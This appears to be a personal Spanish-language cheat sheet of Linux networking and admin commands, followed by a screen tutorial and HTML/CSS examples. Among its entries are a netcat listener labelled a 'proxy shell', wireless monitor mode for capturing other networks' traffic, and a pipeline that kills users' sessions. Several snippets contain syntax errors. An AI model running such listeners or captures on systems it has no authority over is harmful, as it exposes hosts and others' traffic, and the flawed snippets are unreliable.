#### para que nos muestre la informacion de la configuracion de red inalambrica (nombre de red, canal, nivel de senal, velocidad, potencia, cifrado, punto de acceso, si en punto de acceso especifica:  ff:ff:ff:ff:ff:ff es que no esta asociado a ninguno punto de acceso ####

iwconfig ath0

#### para asociar nuestra placa de red inalambrica con un punto de acceso suponiendo que el punto de acceso tiene como nombre curiousx tenemos que hacer ####

iwconfig ath0 essid "curiousx"

#### para poner nuestra targeta inalambrica en modo monitor (esto quiere decir que nuestra targeta de red escuchara por todos los canales, y podremos capturar trafico de redes externas)  ####

iwconfig ath0 mode monitor

#### para conectarnos a nuestro router ####

iwconfig ath0 mode managed

#### para configurar nuestra targeta de red inalambrica en modo ad-hoc util para darle salida a internet a varios pcs desde nuestra computadora ####

iwconfig ath0 mode ad-hoc

#### establecemos el canal en el que nuestra tarjeta recibira y transmitira datos paquetes de red ####

iwconfig ath0 channel 6
 
#### podemos tambien establecer como parametro la frecuencia ####

iwconfig ath0 freq 2.412g

#### canales y sus correspondientes frecuencias ####

#  canal 1= 2.412g  #  canal 2= 2.417g  #  canal 3= 2.422g  #  canal 4= 2.427g  #  canal 5= 2.432g  #  canal 6= 2.437g  #  canal 7= 2.442g  #  canal 8= 2.447g  #  canal 9= 2.452g  #  canal 10= 2.457g  #  canal 11= 2.462g  #  canal 12= 2.467g  #  canal 13= 2.472g  #  canal 14= 2.484g  #

#### rate o velosidad en la que trabajara nuestra tarjeta inalambrica ####

iwconfig ath0 rate 11m

#### podemos tambien utilizar 54m. o ponerlo en modo automatico para que la tarjeta elija la velocidad adecuada ####

iwconfig ath0 rate auto



#############################################################################################################################################################################################

########################################################################################### iwlist ##########################################################################################

#### iwlist

#### uso basico de iwlist

iwlist [interface] [opcion]

#### para ver la informacion de todas las redes inalambricas que nuestra tarjeta detecta. obviamente en modo monitor dara cero resultados. la diferentes redes que se detectan pueden cambiar, por lo tanto no vamos a estar todo el rato introduciendo este comando. hay herramientas que dan informacion de lo que hay en tiempo real. el airodump en modo monitor puede hacer un barrido en tiempo real de las redes proximas. ademas graba en un archivo todas las detecciones aunque solamente haya sido en un momento puntual, esto sirve para saber si necesitamos colocar una antena para recibir con mayor calidad y senal posible redes a analizar. el airodump hace mas cosas y hay mas herramientas para la deteccion como el kismet, etc ####

iwlist ath0 scan

#### para ver los diferentes valores de frecuencia y su correspondencia en el numero de canal validos para nuestra tarjeta asi como la frecuencia y el canal en el que se encuentra en esos momentos la tarjeta. ejemplo: mediante aviso en pantalla current frequency =2.412ghz (channel 1). en modo monitor al hacer un barrido de diferentes canales y si ejecutamos este comando varias veces veremos que la frecuencia actual (current frequency) va cambiando.

iwlist ath0 frequency

iwlist ath0 channel

#### para ver las velocidades de comunicacion que nuestra tarjeta soporta asi como la velocidad actual (mediante current bit rate)

iwlist ath0 rate



#############################################################################################################################################################################################

########################################################################################### dhclient ########################################################################################

#### dhclient

#### para obtener ip por dhcp ####

dhclient eth0



#############################################################################################################################################################################################

############################################################################################ route ##########################################################################################

#### route

#### para ver la tabla de enrutado

route -e -v

#### para ver si tenemos nuestras interfaces de red asociadas a nuestro punto de acceso ####

route   -   route -n

#### para establecer el punto de acceso ####

route add default gw 192.168.1.1 eth0

#### si queremos eliminar una de ellas para poder sobrescribirla tenemos ####

route del default



#############################################################################################################################################################################################

########################################################################################### pppoe ###########################################################################################

#### pppoe

#### inicia conexion dhcp mediante el cliente pump ####

pump -i eth0/eth1

#### programa para configurar conexiones pppoe ####

pppoeconf

#### programa en modo texto para configurar una conexion ppp ####

pppconfig

#### establece la conexion ppp a internet ####

pon

#### monitoriza la conexion ppp ####

plog

#### finaliza la conexion ppp a internet ####

poff



#############################################################################################################################################################################################

############################################################################################ who ############################################################################################

#### who

#### muestra informacion de los usuarios conectados al sistema ####

who -a -h

#### cerrar la sesion de todos los usuario logueados en el sistema, menos el usuario root ####

who -u | grep -v root | awk {'print $6'} | kill `awk {'print $0'}`



#############################################################################################################################################################################################

########################################################################################### users ###########################################################################################

#### users

#### muestra informacion de los usuarios conectados al sistema ####

users



#############################################################################################################################################################################################

############################################################################################# id ############################################################################################

#### id

#### muestra informacion del usuario actual, (grupos a los que pertenece, uid, gid) ####

id


#############################################################################################################################################################################################

########################################################################################## groups ###########################################################################################

#### groups

#### muestra los grupos a los que pertenece un usuario ####

groups


#############################################################################################################################################################################################

########################################################################################### whois ###########################################################################################

#### whois

#### whois nos muestra informacion sobre un dominio

#### su forma basica de uso es ####

whois dominio.com



#############################################################################################################################################################################################

########################################################################################### host ############################################################################################

#### host

#### si host le damos el nombre de un dominio podemos veremos la ip asociada al mismo, o le damos una ip y veremos el nombre de dominio asociado (dns lookup)

#### forma basica de uso ####

host howtogeek.com

host 208.43.115.82




#############################################################################################################################################################################################

################################################################################### tracepath y traceroute ##################################################################################

#### tracepath #### traceroute

#### estos comandos muestran la ruta de red hasta un destino especificado mostrando los saltos hasta llegar al host ####



#############################################################################################################################################################################################

############################################################################################ mtr ############################################################################################

#### mtr

#### mtr combina el comando ping con el tracepath en un solo comando ####



#############################################################################################################################################################################################

########################################################################################### sysdig ##########################################################################################

#### sysdig

#### see all the failed file opens by httpd ####

sysdig "proc.name=httpd and evt.type=open and evt.failed=true"

#### see the files where most time has been spent ####

sysdig -c topfiles_time

#### see the files where apache spent most time ####

sysdig -c topfiles_time proc.name=httpd

#### see the top processes in terms of i/o errors ####

sysdig -c topprocs_errors

#### see the top files in terms of i/o errors ####

sysdig -c topfiles_errors

#### see the system calls where most time has been spent ####

sysdig -c topscalls_time

#### see the top system calls returning errors ####

sysdig -c topscalls "evt.failed=true"

#### snoop failed file opens as they occur ####

sysdig -p "%12user.name %6proc.pid %12proc.name %3fd.num %fd.typechar %fd.name" evt.type=open and evt.failed=true

#### print the file i/o calls that have a latency greater than 1ms: ####

sysdig -c fileslower 1

#############################################################################################################################################################################################

############################################################################################ mknod ##########################################################################################

#### mknod

#### proxy shell listen and write ####
 
mknod replypipe p; nc -k -lp 1234 < replypipe| nc -u /var/run/mysocket.sock > replypipe



#############################################################################################################################################################################################

############################################################################################ tcpdump ########################################################################################

#### tcpdump

#### mostrar todo el trafico http ####

tcpdump TCP port 80

#### tcpdump top 10 talkers ####

tcpdump -tnn -c 2000 -i eth0 | awk -f "." '{print $1"."$2"."$3"."$4}' | sort | uniq -c | sort -nr | awk ' $1 > 10 '



#############################################################################################################################################################################################

############################################################################################ screen #########################################################################################

#### screen

#### introduccion a screen ####

screen, al mas puro estilo de la filosofia unix "haz solo una tarea y hazla bien" se trata de una pequena herramienta/utilidad cuyo cometido no es otro que crear terminales virtuales.

a pesar de su simplicidad su potencia es enorme. el manejo de screen requiere un cierto entrenamiento (posiblemente 1 a 3 horas) el entrenamiento consistira en memorizar los comandos tipicos de screen hasta automatizarlos sin pensar. el esfuerzo merece la pena ya que una vez aprendido su uso, sera una de las herramientas que siempre tengamos a nuestro lado y nos ayudara en cualquier otra tarea que queramos realizar en nuestro sistema, ya sea administrar un servidor apache, una base de datos como postrgresql o mysql, un servidor de correo, una centralita telefonica asterix, o cualquier otra aplicacion que nos venga a la memoria.

lo mejor es verlo mediante ejemplos. para empezar, ejecutamos una terminal como xterm, gnome-terminal, terminator o kconsole y dentro de la misma iniciamos nuestra primera sesion de screen:

    ~$ screen
    screen version 4.00.03jw4 (fau) 2-may-06

    copyright (c) 1993-2002 juergen weigert, michael schroeder
    copyright (c) 1987 oliver laumann

    this program is free software; you can redistribute it and/or modify it under
    the terms of the gnu general public license as published by the free software
    foundation; either version 2, or (at your option) any later version.

    this program is distributed in the hope that it will be useful, but without
    any warranty; without even the implied warranty of merchantability or fitness
    for a particular purpose. see the gnu general public license for more details.

    you should have received a copy of the gnu general public license along with
    this program (see the file copying); if not, write to the free software
    foundation, inc., 51 franklin street, fifth floor, boston, ma 02110-1301 usa.

    send bugreports, fixes, enhancements, t-shirts, money, beer & pizza to
    screen@uni-erlangen.de


    [press space for next page; return to end.]




pulsamos enter(=return) y a continuacion volvemos a un prompt similar al que teniamos antes de ejecutar screen:

    ~$


aparentemente no ha sucedido nada extraordinario. sin embargo acabamos de crear una sesion de screen. ejecutamos un comando:

    ~$ echo "shell 0"
    shell 0
    ~$ _



y a continuacion salimos de screen. para ello pulsamos simultaneamente "ctrl+a" y seguido "d" (a minuscula y d minuscula).


    ~$ screen
    [detached]



la combinacion de "ctrl+a" es la forma de indicar a screen que queremos enviarle un comando. seguidamente enviamos el comando que queramos. en este caso "d" (detach/desliguar), que le indica que queremos desligarnos de la sesion de screen. a continuacion cerramos la terminal xterm(o gnome-terminal, kconsole,...) y volvemos a ejecutar una nueva terminal. en la misma escribimos el comando:

    ~$ screen -r



nuestra primera y agradable sorpresa. la pantalla mostrara:

    ~$ echo "shell 0"
    shell 0
    ~$ _



vemos que a pesar de haber cerrado la terminal nuestra sesion screen sigue intacta. la sesion se guarda en memoria y mientra no se reinicie la maquina o explicitamente le indiquemos a screen que queremos acabar la sesion seguira alli "para siempre". una sesion de screen no muere si la red se desconecta. al volver la red y volver a conectar nuestra sesion de screen seguira alli. una sesion de screen puede durar una hora, lo que tardemos en realizar una tarea. o varios meses, si asi lo deseamos. ejecutamos un segundo comando screen, "ctrl+a" y seguido "s" (mayuscula). segunda sorpresa, nuestra terminal se ha divido en dos pantallas virtuales apiladas una encima de la otra.

    ~$ echo "shell 0"
    shell 0
    ~$ _
    <-- pantalla 0


    *0 bash*********************************

    <-- pantalla 1


    *--*************************************




el cursos estara parpadeando en la pantalla superior. para saltar a la segunda pantalla utilizamos "ctrl+a" "tab" (tabulador) y el cursor parpadeante se mostrara ahora en la pantalla inferior indicando que es la ventana activa. esta pantalla inferior inicialmente no tiene nada. para darle vida, utilizamos el comando screen "ctrl+a" "c" (minuscula). esto ejecutara una shell nueva en la misma.

    ~$ echo "shell 0"
    shell 0
    ~$ _
    <-- pantalla 0


    *0 bash*********************************
    ~$
    <-- pantalla 1


    *--*************************************



ahora nuestra sesion screen se compone de 2 pantallas y 2 shells. las shells y las pantallas son independientes en screen. podemos tener una sola pantalla y 3 shells o 3 pantallas y una sola shell (aunque este ultimo caso no es muy util). para no liar primero veremos como listar las shells activas. pulsando "ctr+a" "comillas" (comillas dobles) veremos algo similar a:

    ~$ echo "shell 0"
    shell 0
    ~$ _
    <-- pantalla 0


    *0 bash*********************************
    num name flags

    0 bash
    *1 bash********************************* <-- pantalla 1

    *--*************************************



"ctr+a" comillas muestra el listado de shells creadas (recordemos mediante el comando "ctrl+a" "c" ) y en negrita la shell activa en la pantalla. de momento pulsamos enter que selecciona la shell 1 en la pantalla 1 y a continuacion ejecutamos el comando echo "shell 1":

    ~$ echo "shell 0"
    shell 0
    ~$ _
    <-- pantalla 0


    *0 bash*********************************
    ~$ echo "shell 1"
    shell 1
    <-- pantalla 1

    *--*************************************



si a continuacion creamos una tercera shell mediante "ctrl+a" "c" nos encontramos con:

    ~$ echo "shell 0"
    shell 0
    ~$ _
    <-- pantalla 0


    *0 bash*********************************
    ~$

    <-- pantalla 1

    *--*************************************



para no perdernos volvemos a listar las shells creadas mediante "ctrl+a" "comillas" (comillas dobles):

    ~$ echo "shell 0"
    echo "shell 0"
    ~$ _
    <-- pantalla 0


    *0 bash*********************************
    num name flags

    0 bash
    1 bash
    *2 bash********************************* <-- pantalla 1

    *--*************************************



vemos que lo que ha ocurrido es que ahora en la pantalla 1 se visualiza la shell 2. si queremos volver a mostrar la shell 1 en la pantalla 1, mediante las flechas del cursos seleccionamos la shell 1 y pulsamos enter volviendo a la pantalla:

    ~$ echo "shell 0"
    shell 0
    ~$ _
    <-- pantalla 0


    *0 bash*********************************
    ~$ echo "shell 1"
    shell 1
    <-- pantalla 1

    *--*************************************



por el momento nos olvidamos de las pantallas. finalizamos la pantalla activa 1 mediante "ctr+a" "x" y volvemos a tener una unica pantalla que ocupa toda la ventana de nuestra terminal x:

    ~$ echo "shell 0"
    shell 0
    ~$ _



recordemos que las pantallas y las shells son totalmente independientes para screen. ahora podemos visualizar la shell 1 o 2 seleccionandolas en el listado de shells con "ctrl+a" comillas (dobles):

    num name flags

    *0 bash*********************************
    1 bash
    2 bash



vamos a la shell 1 seleccionando con el cursor:

    ~$ echo "shell 1"
    shell 1



hora de comer. nos desligamos de la sesion screen ("ctrl+a" "d" ) volviendo al momento en que nos reconectamos:

    ~$ screen -r
    [detached]
    ~$ _



cerramos la terminal x y nuestro entorno grafico (gnome/kde/xfce/...) hasta mas adelante.

preguntas frecuentes

p:?como terminar una sesion de screen?

r: la sesion termina cuando salimos de la ultima shell. es decir basta hacer un "exit" sobre cada shell activa.

p:?puede compartirse una sesion de screen entre varios usuarios?

r: si. el primero de ellos crea la sesion o se reconecta mediante "screen -r". el resto de usuarios utilizara "screen -x". en ese momentos cada usuario podra ver y editar lo que hacen los demas usuarios (siempre y cuando visualicen la misma shell dentro de la sesion).

p:?existe la opcion de dividir la pantalla verticalmente en vez de horizontalmente?

r: si, utilizando "ctrl+a" | (tuberia -alt+1 en teclados en espanol-), aunque dependiendo de la configuracion de emulacion de terminal falla en determinados entornos, al menos en el momento de escribir estas lineas.

problemas tipicos

algunas versiones antiguas de screen incluye un comando para bloquear la pantalla. si bloqueamos por error la misma no funcionara nada. la forma de solucionarlo es pulsar "ctrl+a" "q".
en ocasiones la terminal x o la sesion de red muere de forma abrupta y screen no se entera de que nos hemos desligado de la sesion. al intentar reconectar nos indicara que ya hay una sesion de screen pendiente de reconexion. entonces forzamos la reconexion mediante la opcion d. en vez de utilizar "screen -r" utilizamos "screen -rd" que le indica a screen que se olvide de otras sesiones activas.
la sesion de screen muere si apagamos el pc/servidor donde se ejecuta. es decir no guarda el estado de screen en disco de forma milagrosa.

buenas practicas

en nuestros ejemplos creabamos una sesion mediante el comando "screen" y reconectabamos mediante "screen -r". en la practica es conveniente asignar un nombre a la sesion mediante el comando "-s nombredesesion" de forma que creamos una sesion mediante "screen -s nombresesion" y reconectamos mediante "screen -r -s nombresesion". si conectamos a un servidor compartido por varios usuarios es conveniente anadir nuestro nombre de usuario al nombre de la sesion de screen. por ejemplo podemos crear una sesion screen para compilacion y otra para monitorizacion. la sesion de compilacion puede durar lo que dure la compilacion, mientras que la sesion de monitorizacion puede permanecer activa indefinidamente.
por ser mas pedagogicos se utiliza el comando "ctrl+a" comillas (dobles) para seleccionar la shell asociada a la ventana, pero en la practica es mas rapido utilizar "ctrl+a" n, donde n es un numero entre 0 y el numero de shells activas como atajo de teclado rapido para saltar de una terminal a otra.
"ctrl+a" "a" permite asignar un titulo a cada shell de la sesion. cuando listemos las shells activas se mostrara el titulo en vez de la sesion. p.ej, una shell puede titularse "config" indicando que en la misma estamos editando los archivos de configuracion, una segunda "compiling" inidicando que estamos haciendo un make y una tercera "logs" indicando que en la misma estamos viendo los logs con salida/errores. 

#############################################################################################################################################################################################

#### iniciar urt y b3 ####

screen -dms urban sh start.sh

screen -dms b3 python /home/urt/urban/bbb/b3_run.py -c /home/urt/urban/bbb/conf/b3.xml



#############################################################################################################################################################################################

############################################################################################# bbb ###########################################################################################

#### bbb #### bigbrotherbot

#### bad words and bad names tagging ####


<badword name="fuck">
    <word>fuck</word>
</badword>


<badword name="fuck">
    <regexp>f[u\*]+ck</regexp>
</badword>



#############################################################################################################################################################################################

############################################################################################# ip ############################################################################################

#### ip

#### mostrar puerta de enlace ####

ip route show      

ip route show | grep default | awk {'print $3'}

ip route | awk '/default/{print $3}'


#### rm-rf

# Control de tablas ARP con el comando ip #

El comando ip, al igual que sirve para controlar las IPs de interfaces de red, rutas o túneles, también permite manipular la tabla ARP (Address Resolution Protocol). Sí, para ello tenemos el comando “arp” pero para algunas cosas el comando ip le toma la delantera y es una forma de combinar funcionalidades de muchos comandos (el obsoleto ifconfig, route, arp…) en un único comando. 

La gestión de ARP con el comando ip se hace pasándole el parámetro "neigh" (neighbour/vecino) seguido del resto de parámetros específicos.

Ver la tabla ARP 

# El comando para visualizar la tabla de entradas ARP es: #

ip neigh show

# Se puede abreviar del siguiente modo: #

ip n show

A diferencia que al ejecutar un "arp -a" o visualizar el contenido de /cat/net/arp, el comando ip nos muestra algo más de información. En la última columna nos indica el estado de la máquina (del "vecino") cuando se ha detectado algún problema de conexión:

    REACHABLE: la entrada ARP es válida y hay conectividad.
    STALE: la entrada ARP es válida pero no hay conectividad.
    FAILED: no hay conectividad y la MAC no ha sido detectada.
    DELAY: a la espera de confirmación tras el envío de un paquete.

# Ejemplo: #

ip neigh show

192.168.1.61 dev eth0 lladdr 78:45:c4:aa:52:4e STALE
192.168.1.56 dev eth0  FAILED
192.168.1.1 dev eth0 lladdr 00:0a:e4:8c:46:08 REACHABLE
192.168.1.68 dev eth0  FAILED


# Salida del comando "arp -a" y también del archivo del filesystem /proc: #

arp -a

? (192.168.1.61) at 78:45:c4:aa:52:4e [ether] on eth0
? (192.168.1.56) at  on eth0
? (192.168.1.1) at 00:0a:e4:8c:46:08 [ether] on eth0
? (192.168.1.68) at  on eth0


cat /proc/net/arp

IP address       HW type     Flags       HW address            Mask     Device
192.168.1.61      0x1         0x2         78:45:c4:aa:52:4e     *        eth0
192.168.1.56      0x1         0x0         00:00:00:00:00:00     *        eth0
192.168.1.1       0x1         0x2         00:0a:e4:8c:46:08     *        eth0
192.168.1.68      0x1         0x0         00:00:00:00:00:00     *        eth0


# Flush de la ARP cache #

# El siguiente comando permite limpiar por completo la caché ARP: #

ip -s -s neigh flush all


# Si queremos eliminar de la caché una entrada concreta, podemos hacerlo del siguiente modo: #

ip -s -s neigh flush 192.168.1.100

192.168.1.100 dev eth0 lladdr 00:0v:s4:23:f6:01 ref 132 used 0/0/0 DELAY

*** Round 1, deleting 1 entries ***
*** Flush is complete after 1 round ***


# Añadir entrada ARP #

Para añadir entradas a la tabla de ARP utilizamos la siguiente sintaxis:

ip neigh add {IP-HERE} lladdr {MAC/LLADDRESS} dev {DEVICE} nud {STATE}


# La sintaxis también vale para eliminar o modificar: #

ip neigh { add | del | change | replace } { ADDR [ lladdr LLADDR ] [ nud { permanent | noarp | stale | reachable } ] | proxy ADDR } [ dev DEV ]


Podemos especificar el estado de la entrada con lo que pasemos a "nud". Para una entrada ARP permanente utilizamos permanent y así le indicamos que sea fija y sólo pueda ser eliminada manualmente. Otros parámetros son noarp (definir la entrada como válida y que no requiera validación), stale (definirla como válida pero con necesidad de validación) y reachable (válida hasta que expire por timeout)

# Ejemplo de entrada permanente: #

ip neigh add 192.168.1.100 lladdr 00:5v:54:33:v8:02 dev eth0 nud perm


# Con el comando arp sería así: #

arp -s 192.168.1.100 00:5v:54:33:v8:02


# Eliminar entrada ARP #

Eliminar una entrada ARP es más sencillo, únicamente hay que especificar la dirección IP y el dispositivo al que está asociada:

ip neigh del 192.168.1.100 dev eth0


# Con arp sería: #

arp -d 192.168.1.100


Básicamente esto es lo que debemos conocer para poder controlar las tablas ARP con el comando IP en sustitución (o como complemento) a "arp".



#############################################################################################################################################################################################

########################################################################################### logwatch ########################################################################################

#### logwatch

#### monitorizar log de servicios via mail ####

logwatch --detail 10 --mailto youremailaddress@yourdomain.com --range today --service http --service postfix --service zz-disk_space --format html --OUTPUT mail



#############################################################################################################################################################################################

############################################################################################ nmap ###########################################################################################

#### nmap

#### detectar servidor dhcp en la red ####

nmap --script broadcast-dhcp-discover

#############################################################################################################################################################################################

###################################################################################### update-alternatives ##################################################################################

#### update-alternatives

#### elejir que java usar libre o privativo ####

update-alternatives --config java



#############################################################################################################################################################################################

############################################################################################# html ##########################################################################################

#### html #### css

#### html phpacademy

#### Para deshabilitar el autocompletado en los formularios tenemos que usar el atributo "autocomplete" con el valor "off" en el "input" que querramos o si queremos que se aplique generalmene ponemos el atributo en la etiqueta "form" ####

<!doctype html>
<html>

   <head>
      <meta charset="utf-8">
      <title>Website</title>
   </head>

   <body>
      <form action="" method="get" autocomplete="off">
         <label>
            Username
            <input type="text" name="text">
         </label>
         <label>
            Email
            <input type="email" name="email">
         </label>
         <input type="submit" value="go">
   </body>

</html>


#### video como background, al poner un video como background tenemos que tener en cuenta si realmente necesitamos colocar un video como background, por el hecho de que si tenemos usuarios que se conectan desde dispositivos moviles como como celulares que tienen poco ancho de banda les costara cargar nuestra pagina web si el video es muy pesado ####

#### index.html

<!DOCTYPE html>
<html lang="en">
   <head>
       <meta charset="utf-8">
       <title>Video Background</title>
       <link rel="stylesheet" href="css/main.css">

   </head>
   <body>
      <video autoplay muted loop class="bgvideo" id="bgvideo">
         <source src="videos/video.mp4" type="video/mp4">
      </video>
   </body>
</html>

#### main.css

body {
   background-image:url('pictures/img.png');  <--! esto es en el caso de que el navegador web no soporte reproccion de videos en background, se cargara una imagen -->
   background-size:cover;
}

.bgvideo {
   position:fixed;
   right:0;
   bottom:0;
   min-width:100%;
   min-height:100%;
   width:auto;
   height:auto;
   z-index:-9999;   
}

#### filtros

.bgvideo {
   position:fixed;
   right:0;
   bottom:0;
   min-width:100%;
   min-height:100%;
   width:auto;
   height:auto;
   z-index:-9999;
   -webkit-filter:grayscale(100%); <--! filtros
   filter:grayscale(100%);
   -webkit-filter:sepia(50%);
   filter:sepia(50%); -->   
}

#### velosidad de reproduccion del video

<!DOCTYPE html>
<html lang="en">
   <head>
       <meta charset="utf-8">
       <title>Video Background</title>
       <link rel="stylesheet" href="css/main.css">

   </head>
   <body>
      <video autoplay muted loop class="bgvideo" id="bgvideo">
         <source src="videos/video.mp4" type="video/mp4">
      </video>
   </body>

   <script>
      document.getElementById('bgvideo').playbackRate = 0.8;  <--! script para indicar la velosidad de reproduccion del video -->
   </script>

</html>

#### input types ####

# color

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get">
         <label>
            'Text' type
            <input type="text" autocomplete="off">
         </label>
         <label>
            'Color' type
            <input type="color" name="color"
         </label>
         
         <input type="submit">
      </form>
   </body>
</html>

# date

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get">
         <label>
            'Text' type
            <input type="text" autocomplete="off">
         </label>
         <label>
            'Date' type
            <input type="date">
         </label>

         <input type="submit">
      </form>
   </body>
</html>

# email

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get">
         <label>
            'Text' type
            <input type="text" autocomplete="off">
         </label>
         <label>
            'Email' type
            <input type="email" multiple autocomplete="off"> <--! el atributo "multiple" es para verificar que las direcciones de correo sean escritas correctamente -->
         </label>

         <input type="submit">
      </form>
   </body>
</html>

# month

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get">
         <label>
            'Text' type
            <input type="text" autocomplete="off">
         </label>
         <label>
            'Month' type
            <input type="month"> <--! esta etiqueta se puede utilizar por ejemplo cuando tenemos que poner la fecha en la que expira una tarjeta de credito, es muy comodo cuando se esta utilizando un telefono movil o tablet -->
         </label>

         <input type="submit">
      </form>
   </body>
</html>

# number

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get">
         <label>
            'Text' type
            <input type="text" autocomplete="off">
         </label>
         <label>
            'Number' type
            <input type="number" min="1" max="10" step="1" value="1" autocomplete="off"> <--! el atributo "step" es un multiplicador por cada vez que hacemos click para aumentar o disminuir la cantidad y el atributo "value" es el valor por defecto que tendra el casillero -->
         </label>

         <input type="submit">
      </form>
   </body>
</html>

# range

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get">
         <label>
            <p>How did you find the customers service?</p>
            Very bad <input type="range" name="question" min="1" max="100" step="25" value="50"> Very good
         </label>

         <input type="submit">
      </form>
   </body>
</html>

# search

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get">
         <label>
            'Text' type
            <input type="text" autocomplete="off">
         </label>
         <label>
            'Search' type
            <input type="search" autocomplete="off">
         </label>

         <input type="submit">
      </form>
   </body>
</html>

# tel

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get">
         <label>
            'Text' type
            <input type="text" autocomplete="off">
         </label>
         <label>
            'Tel' type
            <input type="tel" autocomplete="off"> <--! este input no tiene tiene sentido si nos conectamos desde una PC de escritorio, pero si nos conectamos desde un celular al hacer click sobre el casillero para ingresar un numero de telefono este hara que el celular nos de los numeros en tamaño grande para que podamos tipearlos con mayor facilidad -->
         </label>

         <input type="submit">
      </form>
   </body>
</html>

# time

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get">
         <label>
            'Text' type
            <input type="text" autocomplete="off">
         </label>
         <label>
            'Time' type
            <input type="time" step="900"> <--! si a el atributo "step" le pasamos el valor 900 (segundos) esto hara que al querer especificar los minutos estos solo podremos especificar un valor entre 15 minutos -->
         </label>

         <input type="submit">
      </form>
   </body>
</html>

# si queremos deshabilitar el autovalidador que tenemos por defecto en html5 porque quizas queremos utilizar una solucion en javascript o por lo que sea, tenemos que pasarle el atributo "novalidate" a la etiqueta form

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get" novalidate>
         <label>
            'Text' type
            <input type="text" autocomplete="off">
         </label>
         <label>
            'Email' type
            <input type="email autocomplete="off">
         </label>

         <input type="submit">
      </form>
   </body>
</html>

# url

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get">
         <label>
            'Text' type
            <input type="text" autocomplete="off">
         </label>
         <label>
            'URL' type
            <input type="url" autocomplete="off"> <--! esto hara que valide una url comprobara que la url este escrita correctamente -->
         </label>

         <input type="submit">
      </form>
   </body>
</html>

# week

<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <title>HTML5 input types</title>
      <link rel="stylesheet" href="css/main.css">
   </head>
   <body>
      <form action="index.html" method="get">
         <label>
            'Text' type
            <input type="text" autocomplete="off">
         </label>
         <label>
            'Week' type
            <input type="week"> <--! es muy parecido al input type "month" solo que en este caso especificaremos una semana en vez de un mes -->
         </label>

         <input type="submit">
      </form>
   </body>
</html>

# PARA FINALIZAR, POR UNA CUESTION DE SEGURIDAD INFORMATICA SIEMPRE TENEMOS QUE ASEGURARNOS DE QUE LOS DATOS QUE NOS ENVIAN LOS USUARIOS SEAN LOS QUE ESTAMOS ESPERANDO #



#### frontend guidelines html css javascript buenas practicas

# Frontend Guidelines

## HTML

### Semantics

HTML5 provides us with lots of semantic elements aimed to describe precisely the content. Make sure you benefit from its rich vocabulary.

```html
<!-- bad -->
<div id="main">
  <div class="article">
    <div class="header">
      <h1>Blog post</h1>
      <p>Published: <span>21st Feb, 2015</span></p>
    </div>
    <p>…</p>
  </div>
</div>

<!-- good -->
<main>
  <article>
    <header>
      <h1>Blog post</h1>
      <p>Published: <time datetime="2015-02-21">21st Feb, 2015</time></p>
    </header>
    <p>…</p>
  </article>
</main>
```

Make sure you understand the semantic of the elements you're using. It's worse to use a semantic
element in a wrong way than staying neutral.

```html
<!-- bad -->
<h1>
  <figure>
    <img alt=Company src=logo.png>
  </figure>
</h1>

<!-- good -->
<h1>
  <img alt=Company src=logo.png>
</h1>
```

### Brevity

Keep your code terse. Forget about your old XHTML habits.

```html
<!-- bad -->
<!doctype html>
<html lang=en>
  <head>
    <meta http-equiv=Content-Type content="text/html; charset=utf-8" />
    <title>Contact</title>
    <link rel=stylesheet href=style.css type=text/css />
  </head>
  <body>
    <h1>Contact me</h1>
    <label>
      Email address:
      <input type=email placeholder=you@email.com required=required />
    </label>
    <script src=main.js type=text/javascript></script>
  </body>
</html>

<!-- good -->
<!doctype html>
<html lang=en>
  <meta charset=utf-8>
  <title>Contact</title>
  <link rel=stylesheet href=style.css>

  <h1>Contact me</h1>
  <label>
    Email address:
    <input type=email placeholder=you@email.com required>
  </label>
  <script src=main.js></script>
</html>
```

### Accessibility

Accessibility shouldn't be an afterthought. You don't have to be a WCAG expert to improve your
website, you can start immediately by fixing the little things that make a huge difference, such as:

* learning to use the `alt` attribute properly
* making sure your links and buttons are marked as such (no `<div class=button>` atrocities)
* not relying exclusively on colors to communicate information
* explicitly labelling form controls

```html
<!-- bad -->
<h1><img alt="Logo" src="logo.png"></h1>

<!-- good -->
<h1><img alt="My Company, Inc." src="logo.png"></h1>
```

### Language

While defining the language and character encoding is optional, it's recommended to always declare
both at document level, even if they're specified in your HTTP headers. Favor UTF-8 over any other
character encoding.

```html
<!-- bad -->
<!doctype html>
<title>Hello, world.</title>

<!-- good -->
<!doctype html>
<html lang=en>
  <meta charset=utf-8>
  <title>Hello, world.</title>
</html>
```

### Performance

Unless there's a valid reason for loading your scripts before your content, don't block the
rendering of your page. If your style sheet is heavy, isolate the styles that are absolutely
required initially and defer the loading of the secondary declarations in a separate style sheet.
